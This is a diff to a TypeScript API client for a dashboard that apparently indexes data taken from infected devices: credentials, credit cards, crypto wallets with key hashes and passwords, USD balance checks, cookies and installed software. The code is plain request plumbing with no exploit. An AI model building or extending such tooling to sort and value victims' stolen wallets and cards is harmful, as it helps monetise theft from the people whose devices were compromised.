@@ -1,4 +1,4 @@
-import axios from 'axios'
+import axios from 'axios';
 
 const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'
 
@@ -168,6 +168,10 @@ export interface Device {
   total_credentials: number
   total_domains: number
   total_urls: number
+  total_wallets: number
+  total_cookies: number
+  total_screenshots: number
+  total_software: number
   created_at: string
 }
 
@@ -290,6 +294,112 @@ export const fetchCreditCardStats = async (): Promise<CreditCardStats> => {
 
 export const fetchCardBrandStats = async (): Promise<CardBrandStat[]> => {
   const response = await api.get('/api/stats/credit-card-brands')
+  return response.data
+}
+
+// Wallet API Functions
+export interface Wallet {
+  id: number
+  device_id: number
+  wallet_type: string
+  address?: string
+  mnemonic_hash?: string
+  private_key_hash?: string
+  password?: string
+  path?: string
+  source_file?: string
+  balance: number
+  balance_usd?: number
+  last_checked?: string
+  has_balance: boolean
+  token_balances?: string
+  created_at: string
+}
+
+export interface WalletStats {
+  total_wallets: number
+  wallets_with_balance: number
+  total_value_usd: number
+  breakdown_by_type: Record<string, { count: number; total_usd: number }>
+  top_wallets: Array<{
+    id: number
+    wallet_type: string
+    address: string
+    balance: number
+    balance_usd: number
+  }>
+}
+
+export const fetchWallets = async (params: {
+  wallet_type?: string
+  has_balance?: boolean
+  min_balance?: number
+  skip?: number
+  limit?: number
+}): Promise<Wallet[]> => {
+  const response = await api.get('/api/wallets', { params })
+  return response.data
+}
+
+export const fetchWallet = async (walletId: number): Promise<Wallet> => {
+  const response = await api.get(`/api/wallets/${walletId}`)
+  return response.data
+}
+
+export const fetchWalletStats = async (): Promise<WalletStats> => {
+  const response = await api.get('/api/stats/wallets')
+  return response.data
+}
+
+export const fetchDeviceWallets = async (
+  deviceId: number,
+  params?: { wallet_type?: string; has_balance?: boolean }
+): Promise<Wallet[]> => {
+  const response = await api.get(`/api/devices/${deviceId}/wallets`, { params })
+  return response.data
+}
+
+export const triggerBalanceCheck = async (params?: {
+  wallet_ids?: number[]
+  device_id?: number
+}): Promise<{ message: string; updated: number; total_requested: number }> => {
+  const response = await api.post('/api/wallets/check-balance', params)
+  return response.data
+}
+
+// Software API Functions
+export interface Software {
+  id: number
+  software_name: string
+  version?: string
+  source_file: string
+}
+
+export const fetchDeviceSoftware = async (
+  deviceId: number,
+  params?: { limit?: number; offset?: number }
+): Promise<SearchResponse<Software>> => {
+  const response = await api.get(`/api/devices/${deviceId}/software`, { params })
+  return response.data
+}
+
+// Cookie API Functions
+export interface CookieFile {
+  id: number
+  file_name: string
+  file_path: string
+  file_size: number
+  cookie_count: number
+  service: string
+}
+
+export const fetchDeviceCookies = async (
+  deviceId: number,
+  limit: number = 100
+): Promise<CookieFile[]> => {
+  const response = await api.get(`/api/devices/${deviceId}/cookies`, {
+    params: { limit }
+  })
   return response.data
 }
 
